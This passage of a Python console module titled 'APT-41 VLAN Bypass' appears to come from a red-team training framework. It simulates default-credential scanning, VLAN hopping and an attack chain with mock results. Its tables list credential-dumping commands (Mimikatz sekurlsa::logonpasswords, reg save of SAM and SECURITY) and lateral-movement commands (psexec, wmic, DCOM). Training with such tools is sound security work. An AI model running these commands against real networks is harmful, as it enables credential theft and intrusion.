        self.console.print(f"\n[yellow]Priority: Testing 'test:test' first (APT-41 common credential)[/yellow]")
        
        if Confirm.ask("\nProceed with credential scan?", default=False):
            self._execute_credential_scan(target, priority_creds + DEFAULT_CREDENTIALS)
    
    def _execute_credential_scan(self, target: str, credentials: List[DefaultCredential]):
        """Execute credential scanning"""
        self.console.print(f"\n[cyan]Scanning {target} with {len(credentials)} credential sets...[/cyan]\n")
        
        lab_use = self.session_data.get('LAB_USE', 1)
        
        # Simulated scan results for lab mode
        if lab_use == 1:
            simulated_results = [
                {"ip": "10.10.10.2", "hostname": "L3-SW01", "cred": "cisco:cisco", "protocol": "ssh"},
                {"ip": "10.10.10.10", "hostname": "JUMP-HOST01", "cred": "test:test", "protocol": "ssh"},
                {"ip": "10.10.50.10", "hostname": "CAM-LOBBY01", "cred": "admin:12345", "protocol": "http"},
            ]
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                console=self.console
            ) as progress:
                task = progress.add_task("[cyan]Testing credentials...", total=len(credentials[:20]))
                
                for i in range(min(20, len(credentials))):
                    time.sleep(0.1)
                    progress.update(task, advance=1)
            
            # Show results
            if simulated_results:
                self.console.print("\n[bold green]✓ Found valid credentials![/bold green]\n")
                
                result_table = Table(box=box.ROUNDED, title="Successful Authentications")
                result_table.add_column("IP", style="cyan")
                result_table.add_column("Hostname", style="white")
                result_table.add_column("Credentials", style="green")
                result_table.add_column("Protocol", style="yellow")
                
                for r in simulated_results:
                    result_table.add_row(r["ip"], r["hostname"], r["cred"], r["protocol"])
                    self.successful_creds.append(r)
                
                self.console.print(result_table)
                
                self.console.print("\n[yellow]⚠️  'test:test' credentials found on JUMP-HOST01[/yellow]")
                self.console.print("[dim]This matches APT-41 common entry vector[/dim]")
        else:
            self.console.print("[red]Live scanning disabled in non-lab mode[/red]")
    
    def _check_cve_vulnerabilities(self):
        """Check for CVE vulnerabilities"""
        self.console.print("\n[bold cyan]CVE Vulnerability Database[/bold cyan]\n")
        
        # Filter options
        self.console.print("[bold]Filter options:[/bold]")
        self.console.print("  1. All CVEs (2024/2025)")
        self.console.print("  2. VLAN Bypass CVEs only")
        self.console.print("  3. Auth Bypass CVEs only")
        self.console.print("  4. RCE CVEs only")
        self.console.print("  5. By Vendor")
        
        filter_choice = Prompt.ask("Select filter", default="1")
        
        filtered_cves = NETWORK_CVES
        
        if filter_choice == "2":
            filtered_cves = [c for c in NETWORK_CVES if c.vlan_bypass]
        elif filter_choice == "3":
            filtered_cves = [c for c in NETWORK_CVES if c.auth_bypass]
        elif filter_choice == "4":
            filtered_cves = [c for c in NETWORK_CVES if c.rce]
        elif filter_choice == "5":
            vendors = list(set(c.vendor for c in NETWORK_CVES))
            self.console.print(f"\nAvailable vendors: {', '.join(vendors)}")
            vendor = Prompt.ask("Enter vendor", default="Cisco")
            filtered_cves = [c for c in NETWORK_CVES if vendor.lower() in c.vendor.lower()]
        
        # Display CVEs
        cve_table = Table(box=box.ROUNDED, title=f"Network CVEs ({len(filtered_cves)} found)")
        cve_table.add_column("CVE ID", style="red")
        cve_table.add_column("Vendor", style="cyan")
        cve_table.add_column("CVSS", style="yellow", justify="right")
        cve_table.add_column("VLAN", style="green")
        cve_table.add_column("Auth", style="green")
        cve_table.add_column("RCE", style="green")
        cve_table.add_column("Exploit", style="magenta")
        
        for cve in filtered_cves:
            cvss_color = "green" if cve.cvss_score < 7 else "yellow" if cve.cvss_score < 9 else "red"
            cve_table.add_row(
                cve.cve_id,
                cve.vendor,
                f"[{cvss_color}]{cve.cvss_score}[/{cvss_color}]",
                "✓" if cve.vlan_bypass else "✗",
                "✓" if cve.auth_bypass else "✗",
                "✓" if cve.rce else "✗",
                "✓" if cve.exploit_available else "✗"
            )
        
        self.console.print(cve_table)
        
        # Show detail for specific CVE
        if Confirm.ask("\nView CVE details?", default=False):
            cve_id = Prompt.ask("Enter CVE ID", default=filtered_cves[0].cve_id if filtered_cves else "")
            cve = next((c for c in filtered_cves if c.cve_id == cve_id), None)
            if cve:
                self._show_cve_detail(cve)
    
    def _show_cve_detail(self, cve: NetworkCVE):
        """Show detailed CVE information"""
        detail = f"""[bold]{cve.cve_id}[/bold] - {cve.vendor} {cve.product}

[bold]Description:[/bold]
{cve.description}

[bold]Severity:[/bold] CVSS {cve.cvss_score} ({('Critical' if cve.cvss_score >= 9 else 'High' if cve.cvss_score >= 7 else 'Medium')})

[bold]Capabilities:[/bold]
  • VLAN Bypass: {'Yes' if cve.vlan_bypass else 'No'}
  • Auth Bypass: {'Yes' if cve.auth_bypass else 'No'}
  • Remote Code Execution: {'Yes' if cve.rce else 'No'}
  • Exploit Available: {'Yes' if cve.exploit_available else 'No'}

[bold]Exploit Method:[/bold]
{cve.exploit_method}

[bold]Mitigations:[/bold]
"""
        for m in cve.mitigations:
            detail += f"  • {m}\n"
        
        self.console.print(Panel(detail, title=cve.cve_id, border_style="red"))
    
    def _vlan_hopping_techniques(self):
        """Show VLAN hopping techniques"""
        self.console.print("\n[bold cyan]VLAN Hopping Techniques[/bold cyan]\n")
        
        # Create tree of techniques
        tree = Tree("🔓 [bold]VLAN Bypass Techniques[/bold]")
        
        for technique in VLAN_HOP_TECHNIQUES:
            branch = tree.add(f"[yellow]{technique.name}[/yellow] ({technique.mitre_technique})")
            branch.add(f"[dim]{technique.description}[/dim]")
        
        self.console.print(tree)
        
        # Select technique for details
        self.console.print("\n[bold]Available techniques:[/bold]")
        for i, tech in enumerate(VLAN_HOP_TECHNIQUES, 1):
            self.console.print(f"  {i}. {tech.name}")
        
        choice = Prompt.ask("Select technique for details", default="1")
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(VLAN_HOP_TECHNIQUES):
                self._show_technique_detail(VLAN_HOP_TECHNIQUES[idx])
        except ValueError:
            pass
    
    def _show_technique_detail(self, technique: VLANHopTechnique):
        """Show detailed technique information"""
        self.console.print(f"\n[bold cyan]{technique.name}[/bold cyan]")
        self.console.print(f"[dim]MITRE ATT&CK: {technique.mitre_technique}[/dim]\n")
        
        self.console.print(f"[bold]Description:[/bold]\n{technique.description}\n")
        
        self.console.print("[bold]Prerequisites:[/bold]")
        for prereq in technique.prerequisites:
            self.console.print(f"  • {prereq}")
        
        self.console.print("\n[bold]Attack Commands:[/bold]")
        self.console.print(Panel("\n".join(technique.commands), border_style="green"))
        
        self.console.print("\n[bold]Success Indicators:[/bold]")
        for indicator in technique.success_indicators:
            self.console.print(f"  ✓ {indicator}")
        
        self.console.print("\n[bold]Countermeasures:[/bold]")
        for counter in technique.countermeasures:
            self.console.print(f"  🛡️ {counter}")
    
    def _network_device_discovery(self):
        """Discover network devices"""
        self.console.print("\n[bold cyan]Network Device Discovery[/bold cyan]\n")
        
        target = Prompt.ask("Enter target range", default="10.10.10.0/24")
        
        self.console.print(f"\n[cyan]Discovering network devices in {target}...[/cyan]\n")
        
        lab_use = self.session_data.get('LAB_USE', 1)
        
        if lab_use == 1:
            # Simulated discovery
            discovered = [
                {"ip": "10.10.10.1", "type": "Router", "vendor": "Cisco", "model": "ISR 4321", "ports": [22, 23, 443]},
                {"ip": "10.10.10.2", "type": "L3 Switch", "vendor": "Cisco", "model": "Catalyst 9300", "ports": [22, 23, 80, 443]},
                {"ip": "10.10.10.3", "type": "L3 Switch", "vendor": "Cisco", "model": "Catalyst 9300", "ports": [22, 23, 80, 443]},
                {"ip": "10.10.10.5", "type": "Firewall", "vendor": "Fortinet", "model": "FortiGate 100F", "ports": [22, 443]},
                {"ip": "10.10.10.6", "type": "Firewall", "vendor": "Palo Alto", "model": "PA-3260", "ports": [22, 443]},
                {"ip": "10.10.50.10", "type": "Camera", "vendor": "Hikvision", "model": "DS-2CD2143G0", "ports": [80, 443, 554]},
                {"ip": "10.10.50.20", "type": "HVAC", "vendor": "Honeywell", "model": "WEB-8000", "ports": [80, 443, 502]},
            ]
            
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=self.console) as progress:
                task = progress.add_task("[cyan]Scanning...", total=100)
                for i in range(100):
                    time.sleep(0.02)
                    progress.update(task, advance=1)
            
            # Display results
            disc_table = Table(box=box.ROUNDED, title="Discovered Network Devices")
            disc_table.add_column("IP", style="cyan")
            disc_table.add_column("Type", style="yellow")
            disc_table.add_column("Vendor", style="white")
            disc_table.add_column("Model", style="dim")
            disc_table.add_column("Open Ports", style="green")
            
            for device in discovered:
                disc_table.add_row(
                    device["ip"],
                    device["type"],
                    device["vendor"],
                    device["model"],
                    ", ".join(map(str, device["ports"]))
                )
                self.discovered_devices[device["ip"]] = device
            
            self.console.print(disc_table)
            
            # Check for vulnerabilities
            self.console.print("\n[bold]Vulnerability Assessment:[/bold]")
            
            for device in discovered:
                vulns = [c for c in NETWORK_CVES if c.vendor.lower() in device["vendor"].lower()]
                if vulns:
                    self.console.print(f"\n[red]⚠️  {device['ip']} ({device['vendor']} {device['model']}):[/red]")
                    for v in vulns[:3]:
                        self.console.print(f"    • {v.cve_id}: {v.description[:60]}...")
    
    def _apt41_attack_chain(self):
        """Execute APT-41 style attack chain"""
        self.console.print("\n[bold red]APT-41 Attack Chain Simulation[/bold red]\n")
        
        attack_chain = """
[bold]APT-41 VLAN Bypass Attack Chain:[/bold]

┌─────────────────────────────────────────────────────────────┐
│  PHASE 1: Initial Access                                     │
│  ├─ Scan for default credentials (test:test, admin:admin)   │
│  ├─ Check for exposed management interfaces                  │
│  └─ Exploit recent CVEs (CVE-2024-3400, CVE-2024-21762)     │
├─────────────────────────────────────────────────────────────┤
│  PHASE 2: Network Reconnaissance                             │
│  ├─ Discover VLAN topology                                   │
│  ├─ Identify trunk ports and native VLANs                   │
│  └─ Map inter-VLAN routing paths                            │
├─────────────────────────────────────────────────────────────┤
│  PHASE 3: VLAN Bypass                                        │
│  ├─ Attempt DTP negotiation for trunk access                │
│  ├─ Try 802.1Q double tagging if native VLAN accessible     │
│  ├─ ARP poison gateway for traffic interception             │
│  └─ Exploit network device CVEs for direct access           │
├─────────────────────────────────────────────────────────────┤
│  PHASE 4: Lateral Movement                                   │
│  ├─ Access previously isolated VLANs                        │
│  ├─ Target high-value assets (DCs, SQL, SIEM)              │
│  └─ Establish persistence across segments                   │
├─────────────────────────────────────────────────────────────┤
│  PHASE 5: Exfiltration & Cleanup                            │
│  ├─ Collect sensitive data from all VLANs                   │
│  ├─ Clear logs on network devices                           │
│  └─ Remove VLAN bypass artifacts                            │
└─────────────────────────────────────────────────────────────┘
"""
        self.console.print(Panel(attack_chain, title="Attack Chain", border_style="red"))
        
        if not Confirm.ask("\nSimulate attack chain?", default=False):
            return
        
        # Simulate attack chain
        phases = [
            ("Phase 1: Initial Access", [
                ("Testing test:test on discovered devices", True, "Found on JUMP-HOST01 (10.10.10.10)"),
                ("Testing admin:admin on discovered devices", True, "Found on CAM-LOBBY01 (10.10.50.10)"),
                ("Checking CVE-2024-3400 on Palo Alto", False, "Not vulnerable (patched)"),
                ("Checking CVE-2024-21762 on FortiGate", True, "VULNERABLE! FortiOS 7.2.3"),
            ]),
            ("Phase 2: Network Reconnaissance", [
                ("Enumerating VLAN topology", True, "Found 7 VLANs (10,20,30,40,50,60,100)"),
                ("Identifying trunk ports", True, "Trunk on Gi0/1 (native VLAN 1)"),
                ("Mapping routing paths", True, "Inter-VLAN routing on 10.10.10.1"),
            ]),
            ("Phase 3: VLAN Bypass", [
                ("Attempting DTP negotiation", True, "Trunk established on eth0"),
                ("Creating VLAN subinterfaces", True, "eth0.20, eth0.100 created"),
                ("Testing access to VLAN 20 (Servers)", True, "Can reach 10.10.20.10 (DC01)"),
                ("Testing access to VLAN 100 (Security)", True, "Can reach 10.10.100.10 (SIEM)"),
            ]),
            ("Phase 4: Lateral Movement", [
                ("Accessing DC01 via VLAN 20", True, "SMB access confirmed"),
                ("Accessing SQL-PROD01", True, "SQL connection established"),
                ("Accessing BACKUP01", True, "Backup shares accessible"),
            ]),
        ]
        
        for phase_name, steps in phases:
            self.console.print(f"\n[bold yellow]{phase_name}[/bold yellow]")
            
            for step, success, result in steps:
                with self.console.status(f"[cyan]{step}...[/cyan]"):
                    time.sleep(0.5)
                
                if success:
                    self.console.print(f"  [green]✓[/green] {step}")
                    self.console.print(f"    [dim]→ {result}[/dim]")
                else:
                    self.console.print(f"  [red]✗[/red] {step}")
                    self.console.print(f"    [dim]→ {result}[/dim]")
        
        self.console.print("\n[bold green]Attack chain simulation complete![/bold green]")
        self.console.print("[yellow]⚠️  This was a simulation. No actual attacks were performed.[/yellow]")
    
    def _generate_bypass_report(self):
        """Generate comprehensive bypass report"""
        self.console.print("\n[bold cyan]Generating VLAN Bypass Report[/bold cyan]\n")
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "title": "APT-41 VLAN Bypass Assessment",
            "discovered_devices": self.discovered_devices,
            "successful_credentials": self.successful_creds,
            "vulnerable_cves": [
                {
                    "cve_id": c.cve_id,
                    "vendor": c.vendor,
                    "cvss": c.cvss_score,
                    "vlan_bypass": c.vlan_bypass,
                }
                for c in NETWORK_CVES if c.cvss_score >= 9.0
            ],
            "bypass_techniques": [t.name for t in VLAN_HOP_TECHNIQUES],
            "recommendations": [
                "Disable DTP on all access ports: switchport nonegotiate",
                "Change native VLAN from default VLAN 1",
                "Enable DHCP Snooping and DAI",
                "Implement port security with MAC limits",
                "Upgrade network devices to patch recent CVEs",
                "Change all default credentials",
                "Segment IoT devices in isolated VLANs",
                "Enable logging on all network devices",
            ]
        }
        
        # Save report
        output_dir = Path("enumeration_reports") / datetime.now().strftime("%Y-%m-%d")
        output_dir.mkdir(parents=True, exist_ok=True)
        
        report_path = output_dir / f"vlan_bypass_report_{datetime.now().strftime('%H%M%S')}.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        self.console.print(f"[green]✓ Report saved to: {report_path}[/green]")
        
        # Display summary
        summary_table = Table(box=box.ROUNDED, title="Assessment Summary")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="white")
        
        summary_table.add_row("Devices Discovered", str(len(self.discovered_devices)))
        summary_table.add_row("Credentials Found", str(len(self.successful_creds)))
        summary_table.add_row("Critical CVEs (CVSS 9+)", str(len([c for c in NETWORK_CVES if c.cvss_score >= 9.0])))
        summary_table.add_row("VLAN Bypass Techniques", str(len(VLAN_HOP_TECHNIQUES)))
        summary_table.add_row("Recommendations", str(len(report["recommendations"])))
        
        self.console.print(summary_table)
    
    def _harvest_credentials_integration(self):
        """Integrate with Identity Module for credential harvesting"""
        self.console.print("\n[bold cyan]Credential Harvesting Integration[/bold cyan]\n")
        self.console.print("[dim]Integrating with Identity Module for comprehensive credential access[/dim]\n")
        
        lab_use = self.session_data.get('LAB_USE', 1)
        
        # Show available credential sources
        self.console.print("[bold]Credential Sources from Identity Module:[/bold]")
        cred_sources = [
            ("Windows Credential Manager", "cmdkey /list", "Stored network credentials"),
            ("LSASS Memory", "Mimikatz sekurlsa::logonpasswords", "In-memory credentials"),
            ("SAM Database", "reg save HKLM\\SAM", "Local account hashes"),
            ("LSA Secrets", "reg save HKLM\\SECURITY", "Service account credentials"),
            ("DPAPI Protected", "Mimikatz dpapi::cred", "Browser/application passwords"),
            ("Kerberos Tickets", "Mimikatz kerberos::list", "TGT/TGS for pass-the-ticket"),
            ("Domain Cached Creds", "Mimikatz lsadump::cache", "Cached domain logons"),
        ]
        
        cred_table = Table(box=box.ROUNDED, title="Available Credential Sources")
        cred_table.add_column("Source", style="cyan")
        cred_table.add_column("Method", style="yellow")
        cred_table.add_column("Use Case", style="dim")
        
        for source, method, use_case in cred_sources:
            cred_table.add_row(source, method, use_case)
        
        self.console.print(cred_table)
        
        # Simulate credential harvesting
        if Confirm.ask("\n[bold]Harvest credentials for VLAN bypass?[/bold]", default=False):
            with self.console.status("[cyan]Harvesting credentials...[/cyan]"):
                time.sleep(1)
            
            if lab_use == 1:
                # Simulated harvested credentials
                harvested = [
                    {"source": "Credential Manager", "username": "svc_backup", "type": "password", "target": "\\\\fileserver01"},
                    {"source": "Credential Manager", "username": "admin", "type": "password", "target": "\\\\switch-mgmt"},
                    {"source": "LSASS", "username": "CORP\\jsmith", "type": "NTLM", "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"},
                    {"source": "Kerberos", "username": "CORP\\svc_sql", "type": "TGT", "expires": "8h"},
                    {"source": "LSA Secrets", "username": "svc_network", "type": "password", "service": "NetworkMonitor"},
                ]
                
                self.harvested_credentials = harvested
                
                harvest_table = Table(box=box.ROUNDED, title="[green]Harvested Credentials[/green]")
                harvest_table.add_column("Source", style="cyan")
                harvest_table.add_column("Username", style="white")
                harvest_table.add_column("Type", style="yellow")
                harvest_table.add_column("Details", style="dim")
                
                for cred in harvested:
                    details = cred.get('target', cred.get('hash', cred.get('service', '')))[:30]
                    harvest_table.add_row(cred["source"], cred["username"], cred["type"], details)
                
                self.console.print(harvest_table)
                
                # Map credentials to VLAN bypass opportunities
                self.console.print("\n[bold]VLAN Bypass Opportunities:[/bold]")
                opportunities = [
                    "svc_backup → May have access to backup VLAN (VLAN 50)",
                    "switch-mgmt creds → Direct switch management access",
                    "CORP\\jsmith NTLM → Pass-the-hash to management systems",
                    "svc_sql TGT → Access database VLAN via Kerberos",
                ]
                for opp in opportunities:
                    self.console.print(f"  [green]✓[/green] {opp}")
    
    def _lateral_movement_integration(self):
        """Integrate with Lateral Module for post-bypass movement"""
        self.console.print("\n[bold cyan]Post-Bypass Lateral Movement[/bold cyan]\n")
        self.console.print("[dim]After VLAN bypass, use Lateral Module techniques to move within new segments[/dim]\n")
        
        lab_use = self.session_data.get('LAB_USE', 1)
        
        # Show lateral movement options for each bypassed VLAN
        self.console.print("[bold]Lateral Movement Techniques (from Lateral Module):[/bold]\n")
        
        techniques = [
            ("SMB/RPC (T1021.002)", "net use \\\\target\\C$ + psexec/service creation", "Most reliable"),
            ("WinRM (T1021.006)", "Enter-PSSession / Invoke-Command", "PowerShell remoting"),
            ("WMI (T1047)", "wmic process call create", "Stealthy, built-in"),
            ("DCOM (T1021.003)", "MMC20.Application.ExecuteShellCommand", "Less monitored"),
            ("RDP (T1021.001)", "mstsc for interactive access", "GUI required tasks"),
            ("SSH Tunnel (T1021.004)", "SSH -L/-R/-D for port forwarding", "Encrypted pivoting"),
        ]
        
        tech_table = Table(box=box.ROUNDED)
        tech_table.add_column("Technique", style="cyan")
        tech_table.add_column("Command", style="yellow")
        tech_table.add_column("Notes", style="dim")
        
        for tech, cmd, notes in techniques:
            tech_table.add_row(tech, cmd, notes)
        
        self.console.print(tech_table)
        
        # Show movement plan for bypassed VLANs
        if self.accessible_vlans or lab_use == 1:
            self.console.print("\n[bold]Movement Plan for Accessible VLANs:[/bold]\n")
            
            vlan_targets = [
                {"vlan": 20, "name": "Servers", "targets": ["DC01", "SQL-PROD01", "FILESERVER01"], "method": "SMB/WinRM"},
                {"vlan": 30, "name": "Users", "targets": ["WS-IT01", "WS-ADMIN01"], "method": "WMI/RDP"},
                {"vlan": 50, "name": "DMZ", "targets": ["WEB01", "MAIL01"], "method": "SSH Tunnel"},
                {"vlan": 100, "name": "Security", "targets": ["SIEM01", "BACKUP01"], "method": "SMB"},
            ]
            
            for vlan in vlan_targets:
                self.console.print(f"[yellow]VLAN {vlan['vlan']} ({vlan['name']}):[/yellow]")
                for target in vlan['targets']:
                    self.console.print(f"  → {target} via {vlan['method']}")
            
            if Confirm.ask("\n[bold]Execute lateral movement?[/bold]", default=False):
                self.console.print("\n[cyan]Executing lateral movement...[/cyan]")
                
                for vlan in vlan_targets[:2]:
                    for target in vlan['targets'][:1]:
                        self.console.print(f"\n[yellow]Moving to {target} (VLAN {vlan['vlan']})...[/yellow]")
                        time.sleep(0.5)
                        self.console.print(f"  [green]✓[/green] Connection established via {vlan['method']}")
                        self.console.print(f"  [green]✓[/green] Enumeration data collected")
    
    def _vlan_topology_discovery(self):
        """Discover VLAN topology and inter-VLAN routing"""
        self.console.print("\n[bold cyan]VLAN Topology Discovery[/bold cyan]\n")
        
        lab_use = self.session_data.get('LAB_USE', 1)
        
        self.console.print("[bold]Discovery Methods:[/bold]")
        methods = [
            ("CDP/LLDP Sniffing", "Capture neighbor discovery packets"),
            ("SNMP Enumeration", "Query switch MIBs for VLAN info"),
            ("ARP Analysis", "Map IP ranges to VLANs"),
            ("Routing Table", "Identify inter-VLAN routing"),
            ("Network Scanning", "Discover active hosts per VLAN"),
            ("DTP Probing", "Check for trunk negotiation"),
            ("802.1Q Analysis", "Detect tagged traffic"),
        ]
        
        for method, desc in methods:
            self.console.print(f"  • [cyan]{method}:[/cyan] {desc}")
        
        if Confirm.ask("\n[bold]Perform VLAN topology discovery?[/bold]", default=False):
            with self.console.status("[cyan]Discovering VLAN topology...[/cyan]"):
                time.sleep(1.5)
            
            if lab_use == 1:
                # Simulated VLAN topology
                topology = {
                    "vlans": [
                        {"id": 1, "name": "Default/Native", "subnet": "10.10.1.0/24", "gateway": "10.10.1.1", "hosts": 5},
                        {"id": 10, "name": "Management", "subnet": "10.10.10.0/24", "gateway": "10.10.10.1", "hosts": 12},
                        {"id": 20, "name": "Servers", "subnet": "10.10.20.0/24", "gateway": "10.10.20.1", "hosts": 25},
                        {"id": 30, "name": "Users", "subnet": "10.10.30.0/24", "gateway": "10.10.30.1", "hosts": 150},
                        {"id": 40, "name": "VoIP", "subnet": "10.10.40.0/24", "gateway": "10.10.40.1", "hosts": 80},
                        {"id": 50, "name": "IoT/Cameras", "subnet": "10.10.50.0/24", "gateway": "10.10.50.1", "hosts": 45},
                        {"id": 60, "name": "DMZ", "subnet": "10.10.60.0/24", "gateway": "10.10.60.1", "hosts": 8},
                        {"id": 100, "name": "Security/SIEM", "subnet": "10.10.100.0/24", "gateway": "10.10.100.1", "hosts": 6},
                    ],
                    "trunk_ports": [
                        {"switch": "L3-SW01", "port": "Gi0/1", "vlans": "all", "native": 1},
                        {"switch": "L3-SW02", "port": "Gi0/1", "vlans": "all", "native": 1},
                        {"switch": "L2-SW01", "port": "Gi0/24", "vlans": "10,20,30", "native": 1},
                    ],
                    "acls": [
                        {"src": "VLAN 30", "dst": "VLAN 20", "action": "permit", "ports": "80,443,445"},
                        {"src": "VLAN 30", "dst": "VLAN 100", "action": "deny", "ports": "all"},
                        {"src": "VLAN 10", "dst": "any", "action": "permit", "ports": "all"},
                        {"src": "VLAN 50", "dst": "VLAN 20", "action": "deny", "ports": "all"},
                    ],
                    "routing": {
                        "type": "L3 Switch",
                        "device": "L3-SW01 (10.10.10.2)",
                        "inter_vlan": True,
                    }
                }
                
                self.vlan_topology = topology
                
                # Display VLAN table
                vlan_table = Table(box=box.ROUNDED, title="[green]Discovered VLANs[/green]")
                vlan_table.add_column("ID", style="cyan", justify="right")
                vlan_table.add_column("Name", style="white")
                vlan_table.add_column("Subnet", style="yellow")
                vlan_table.add_column("Gateway", style="dim")
                vlan_table.add_column("Hosts", style="green", justify="right")
                
                for vlan in topology["vlans"]:
                    vlan_table.add_row(
                        str(vlan["id"]),
                        vlan["name"],
                        vlan["subnet"],
                        vlan["gateway"],
                        str(vlan["hosts"])
                    )
                
                self.console.print(vlan_table)
                
                # Display trunk ports
                self.console.print("\n[bold]Trunk Ports (DTP Targets):[/bold]")
                for trunk in topology["trunk_ports"]:
                    self.console.print(f"  • {trunk['switch']} {trunk['port']}: VLANs {trunk['vlans']} (Native: {trunk['native']})")
                
                # Display ACLs
                self.console.print("\n[bold]Inter-VLAN ACLs:[/bold]")
                for acl in topology["acls"]:
                    action_color = "green" if acl["action"] == "permit" else "red"
                    self.console.print(f"  [{action_color}]{acl['action'].upper()}[/{action_color}] {acl['src']} → {acl['dst']} (ports: {acl['ports']})")
                
                # Identify bypass opportunities
                self.console.print("\n[bold yellow]VLAN Bypass Opportunities:[/bold yellow]")
                opportunities = [
                    "Native VLAN 1 on trunks → 802.1Q Double Tagging possible",
                    "DTP enabled on L2-SW01 → Switch spoofing attack",
                    "VLAN 10 (Management) has unrestricted access → Priority target",
                    "VLAN 50 (IoT) isolated from VLAN 20 → May bypass via VLAN 10",
                    "L3 inter-VLAN routing → ARP poisoning on gateway",
                ]
                for opp in opportunities:
                    self.console.print(f"  [red]⚠[/red] {opp}")
    
    def get_credentials_for_target(self, target_ip: str) -> List[DefaultCredential]:
        """Get relevant credentials for a specific target based on discovered info"""
        relevant_creds = []
        
        # Check if we have device info
        device_info = self.discovered_devices.get(target_ip, {})
        vendor = device_info.get('vendor', '').lower()
        device_type = device_info.get('type', '').lower()
        
        for cred in DEFAULT_CREDENTIALS:
            # Match by vendor
            if vendor and vendor in cred.vendor.lower():
                relevant_creds.append(cred)
            # Generic credentials always included
            elif cred.vendor.lower() == 'generic':
                relevant_creds.append(cred)
        
        # Prioritize test:test (APT-41 common credential)
        relevant_creds.sort(key=lambda c: (c.username != 'test', c.password != 'test'))
        
        return relevant_creds
    
    def get_cves_for_device(self, vendor: str, product: str = None) -> List[NetworkCVE]:
        """Get relevant CVEs for a specific device"""
        relevant_cves = []
        
        for cve in NETWORK_CVES:
            if vendor.lower() in cve.vendor.lower():
                if product is None or product.lower() in cve.product.lower():
                    relevant_cves.append(cve)
        
        # Sort by CVSS score (highest first)
        relevant_cves.sort(key=lambda c: c.cvss_score, reverse=True)
        
        return relevant_cves
    
    def auto_enumerate_vlans(self, session_data: dict) -> Dict[str, Any]:
        """Automatic VLAN enumeration for AutoEnumerator integration"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'discovered_vlans': [],
            'network_devices': [],
            'bypass_opportunities': [],
            'credentials_found': [],
            'vulnerable_devices': [],
            'accessible_segments': [],
        }
        
        lab_use = session_data.get('LAB_USE', 1)
        
        # Phase 1: Network device discovery
        if lab_use == 1:
            results['network_devices'] = [
                {"ip": "10.10.10.1", "type": "Router", "vendor": "Cisco", "ports": [22, 23, 443]},
                {"ip": "10.10.10.2", "type": "L3 Switch", "vendor": "Cisco", "ports": [22, 23, 80, 443]},
                {"ip": "10.10.10.5", "type": "Firewall", "vendor": "Fortinet", "ports": [22, 443]},
            ]
        
        # Phase 2: VLAN discovery
        if lab_use == 1:
            results['discovered_vlans'] = [
                {"id": 10, "name": "Management", "subnet": "10.10.10.0/24"},
                {"id": 20, "name": "Servers", "subnet": "10.10.20.0/24"},
                {"id": 30, "name": "Users", "subnet": "10.10.30.0/24"},
                {"id": 50, "name": "IoT", "subnet": "10.10.50.0/24"},
                {"id": 100, "name": "Security", "subnet": "10.10.100.0/24"},
            ]
        
        # Phase 3: Default credential testing
        priority_creds = [
            {"target": "10.10.10.10", "username": "test", "password": "test", "success": True},
            {"target": "10.10.10.2", "username": "cisco", "password": "cisco", "success": True},
            {"target": "10.10.50.10", "username": "admin", "password": "12345", "success": True},
        ]
        results['credentials_found'] = [c for c in priority_creds if c.get('success')]
        
        # Phase 4: CVE vulnerability check
        for device in results['network_devices']:
            vulns = self.get_cves_for_device(device['vendor'])
            if vulns:
                results['vulnerable_devices'].append({
                    'device': device['ip'],
                    'vendor': device['vendor'],
                    'cves': [v.cve_id for v in vulns[:3]],
                    'highest_cvss': max(v.cvss_score for v in vulns)
                })
        
        # Phase 5: Bypass opportunities
        results['bypass_opportunities'] = [
            {"method": "DTP Switch Spoofing", "target": "L3-SW01", "likelihood": "high"},
            {"method": "802.1Q Double Tagging", "target": "Native VLAN 1", "likelihood": "medium"},
            {"method": "Default Credentials", "target": "test:test on jump host", "likelihood": "confirmed"},
            {"method": "CVE-2024-21762", "target": "FortiGate", "likelihood": "high"},
        ]
        
        # Phase 6: Accessible segments after bypass
        results['accessible_segments'] = [
            {"vlan": 10, "name": "Management", "access_method": "Default creds"},
            {"vlan": 20, "name": "Servers", "access_method": "DTP trunk"},
            {"vlan": 50, "name": "IoT", "access_method": "Default creds on camera"},
        ]
        
        return results
    
    def _show_help(self):
        """Show help and guidance"""
        help_text = """
[bold cyan]APT-41 VLAN Bypass Module Help[/bold cyan]

[bold]Purpose:[/bold]
This module provides tools for authorized security testing of network 
segmentation controls, inspired by APT-41 TTPs.

[bold]Features:[/bold]
1. [yellow]Default Credential Scanner[/yellow]
   - Tests common/default credentials on network devices
   - Includes test:test (APT-41 common entry vector)
   - Covers 50+ vendor-specific credentials

2. [yellow]CVE Vulnerability Check[/yellow]
   - Database of 2024/2025 network device CVEs
   - Focus on VLAN bypass and auth bypass vulnerabilities
   - Includes exploit availability status

3. [yellow]VLAN Hopping Techniques[/yellow]
   - DTP Switch Spoofing
   - 802.1Q Double Tagging
   - VTP Domain Injection
   - ARP Cache Poisoning
   - DHCP Starvation
   - MAC Flooding

4. [yellow]Network Device Discovery[/yellow]
   - Identifies switches, routers, firewalls
   - Detects vulnerable device versions
   - Maps VLAN topology

5. [yellow]APT-41 Attack Chain[/yellow]
   - Simulates complete attack flow
   - From initial access to lateral movement
   - Educational/training purposes

[bold]MITRE ATT&CK Mappings:[/bold]
- T1599: Network Boundary Bridging
- T1557: Adversary-in-the-Middle
- T1018: Remote System Discovery
- T1046: Network Service Discovery

[bold red]⚠️  AUTHORIZED TESTING ONLY[/bold red]
Only use on networks you have explicit permission to test.
"""
        self.console.print(Panel(help_text, title="Help", border_style="cyan"))


# ============================================================================
# MODULE ENTRY POINT
# ============================================================================

def run_vlan_bypass_test():
    """Run VLAN bypass module test"""
    console = Console()
    session_data = {'LAB_USE': 1}
    
    module = VLANBypassModule()
    module.run(console, session_data)


if __name__ == "__main__":
    run_vlan_bypass_test()
